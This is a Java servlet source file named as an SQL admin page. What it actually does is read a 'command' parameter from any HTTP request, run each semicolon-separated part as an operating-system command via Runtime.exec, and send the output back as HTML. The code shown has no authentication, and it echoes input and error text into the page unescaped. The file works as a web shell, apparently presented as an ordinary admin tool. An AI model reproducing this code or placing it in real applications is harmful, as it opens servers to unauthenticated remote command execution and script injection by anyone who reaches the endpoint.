package aip.servlet;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import aip.util.AIPUtil;
import aip.util.NVL;

public class AIPSqlAdminServlet extends HttpServlet {
	private static final long serialVersionUID = 3663234880772177494L;
	static final String template = "<form method='post'><table width='100%' border='0'>" +
			"<tr><td colspan='3' style='color:red'><!--CDATA[ErrorMessage]--></td></tr>" +
			"<tr><td>command:</td>" +
			"<td style='width:100%'><textarea name='command' style='width:100%'></textarea></td>" +
			"<td><input type='submit' value='execute'/></td>" +
			"</tr>" +
			"<tr><td colspan='3' style='border:1px solid gray'><!--CDATA[ExecutionResult]--></td></tr>" +
			"</table></form>";
	static final String CRLF="<br/>";//"\n"
	static final String CommandSeperator=";";//"\n"
	
	@Override
	protected void service(HttpServletRequest request, HttpServletResponse response)throws ServletException, IOException {
		String command = NVL.getString(request.getParameter("command"));
		
		PrintWriter out = response.getWriter();
		out.println(executeSysCommand(command));
		out.flush();
		
		//super.service(request, response);
	}
	private String executeSysCommand(String command) {
		StringBuffer html = new StringBuffer(template);

		AIPUtil.replaceAllString(html, "</textarea>", command+"</textarea>");
		
		if(!NVL.isEmpty(command)){
		try {
			StringBuffer executionResult = new StringBuffer();
			String cmd[] = command.split(CommandSeperator);
			Process proc = null;
			
			for(int i=0;i<cmd.length;i++){
				proc = Runtime.getRuntime().exec(cmd[i]);
				
	            /*
	             * for write result in console & set result in sb
	             */
				BufferedReader in = new BufferedReader( new InputStreamReader(proc.getInputStream()));  
	            String line = null;
	            
            	executionResult.append( "Result of:"+cmd[i] );
            	executionResult.append( CRLF );
	            while ((line = in.readLine()) != null) {
	            	executionResult.append(line);
	            	executionResult.append( CRLF );
	            	System.out.println(line);  
	            }
            	executionResult.append( CRLF );
	            executionResult.append( "----------------------------" );
            	executionResult.append( CRLF );
			}
			
			AIPUtil.replaceAllString(html, "<!--CDATA[ExecutionResult]-->"
					, executionResult.toString());

		}catch (Exception e) {
			e.printStackTrace();
			AIPUtil.replaceAllString(html, "<!--CDATA[ErrorMessage]-->", e.getMessage());
		}
		}
		
		return html.toString();
	}

}